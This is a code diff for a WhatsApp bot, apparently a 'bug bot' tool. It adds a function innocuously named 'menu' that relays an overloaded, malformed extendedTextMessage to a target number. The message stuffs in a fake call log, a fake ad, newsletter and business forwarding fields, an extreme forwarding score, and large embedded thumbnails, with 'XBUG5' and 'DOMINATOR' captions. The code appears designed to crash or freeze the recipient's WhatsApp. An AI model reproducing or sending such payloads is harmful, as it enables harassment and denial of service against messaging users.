@@ -228,7 +228,103 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
 
 
 
-
+async function menu(target, cap, Ptcp = false) {
+			await XeonBotInc.relayMessage(target, {
+					"extendedTextMessage": {
+						"text": cap,
+						"contextInfo": {
+							"stanzaId": "1234567890ABCDEF",
+							"participant": "2349072958046@s.whatsapp.net",
+							"quotedMessage": {
+								"callLogMesssage": {
+									"isVideo": true,
+									"callOutcome": "1",
+									"durationSecs": "0",
+									"callType": "REGULAR",
+									"participants": [{
+										"jid": "2349072958046@s.whatsapp.net",
+										"callOutcome": "1"
+									}]
+								}
+							},
+							"remoteJid": target,
+							"conversionSource": "source_example",
+							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+							"conversionDelaySeconds": 10,
+							"forwardingScore": 9999999,
+							"isForwarded": true,
+							"quotedAd": {
+								"advertiserName": "Example Advertiser",
+								"mediaType": "IMAGE",
+								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"caption": "✞𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑✞"
+							},
+							"placeholderKey": {
+								"remoteJid": "62895364760801@s.whatsapp.net",
+								"fromMe": false,
+								"id": "ABCDEF1234567890"
+							},
+							"expiration": 86400,
+							"ephemeralSettingTimestamp": "1728090592378",
+							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+							"externalAdReply": {
+								"title": "XBUG5",
+								"body": "✞𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑✞",
+								"mediaType": "VIDEO",
+								"renderLargerThumbnail": true,
+								"previewTtpe": "VIDEO",
+								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"sourceType": " x ",
+								"sourceId": " x ",
+								"sourceUrl": "https://www.instagram.com/WhatsApp",
+								"mediaUrl": "https://www.instagram.com/WhatsApp",
+								"containsAutoReply": true,
+								"renderLargerThumbnail": true,
+								"showAdAttribution": true,
+								"ctwaClid": "ctwa_clid_example",
+								"ref": "ref_example"
+							},
+							"entryPointConversionSource": "entry_point_source_example",
+							"entryPointConversionApp": "entry_point_app_example",
+							"entryPointConversionDelaySeconds": 5,
+							"disappearingMode": {},
+							"actionLink": {
+								"url": "https://www.instagram.com/WhatsApp"
+							},
+							"groupSubject": "Example Group Subject",
+							"parentGroupJid": "6287888888888-1234567890@g.us",
+							"trustBannerType": "trust_banner_example",
+							"trustBannerAction": 1,
+							"issampled": false,
+							"utm": {
+								"utmSource": "utm_source_example",
+								"utmCampaign": "utm_campaign_example"
+							},
+							"forwardedNewsletterMessageInfo": {
+								"newsletterJid": "6287888888888-1234567890@g.us",
+								"serverMessageId": 1,
+								"newsletterName": " X ",
+								"contentType": "UPDATE",
+								"accessibilityText": " X "
+							},
+							"businessMessageForwardInfo": {
+								"businessOwnerJid": "0@s.whatsapp.net"
+							},
+							"smbClientCampaignId": "smb_client_campaign_id_example",
+							"smbServerCampaignId": "smb_server_campaign_id_example",
+							"dataSharingContext": {
+								"showMmDisclosure": true
+							}
+						}
+					}
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+		};
 var nicetitle = '♱♡ 𓆩Ⱦⱥīɍⱥ Ⱦēȼħ𓆪 ♱♡'
 var nicebody = `XBUG5`
 var niceurl = 'https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r'
